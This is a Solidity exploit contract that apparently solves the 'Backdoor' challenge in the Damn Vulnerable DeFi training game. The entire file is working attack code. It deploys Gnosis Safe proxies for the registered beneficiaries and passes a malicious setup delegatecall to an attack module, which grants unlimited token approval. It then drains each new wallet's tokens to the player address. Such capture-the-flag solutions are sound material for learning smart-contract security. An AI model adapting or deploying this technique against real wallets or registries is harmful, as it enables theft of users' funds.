// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import {IProxyCreationCallback} from "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

import "hardhat/console.sol";

contract AttackModule {
    DamnValuableToken immutable dvtToken;
    address immutable thisAddr;
    address player;

    constructor(address _dvtToken, address _player) {
        thisAddr = address(this);
        dvtToken = DamnValuableToken(_dvtToken);
        player = _player;
    }

    function sendTokens(address proxy) external {
        dvtToken.transferFrom(proxy, player, dvtToken.balanceOf(proxy));
    }

    function approveTokens() external {
        dvtToken.approve(thisAddr, type(uint256).max);
    }
}

contract BackdoorAttack {
    GnosisSafeProxyFactory proxyFactory;
    GnosisSafe masterCopy;
    IProxyCreationCallback walletRegistry;
    address[] beneficiaries;
    DamnValuableToken dvtToken;
    address player;

    constructor(
        address _proxyFactory,
        address payable _masterCopy,
        address _walletRegistry,
        address[] memory _beneficiaries,
        address _dvtToken,
        address _player
    ) {
        proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        masterCopy = GnosisSafe(_masterCopy);
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        beneficiaries = _beneficiaries;
        dvtToken = DamnValuableToken(_dvtToken);
        player = _player;
    }

    function pwn() external {
        for (uint256 i = 0; i < beneficiaries.length; ) {
            address[] memory beneficiaries_ = new address[](1);
            beneficiaries_[0] = beneficiaries[i];

            AttackModule attackModule = new AttackModule(
                address(dvtToken),
                player
            );

            bytes memory initializer = abi.encodeWithSelector(
                masterCopy.setup.selector,
                beneficiaries_,
                1,
                attackModule,
                abi.encodeWithSelector(AttackModule.approveTokens.selector),
                address(0),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                1,
                walletRegistry
            );

            attackModule.sendTokens(address(proxy));

            unchecked {
                ++i;
            }
        }
    }
}
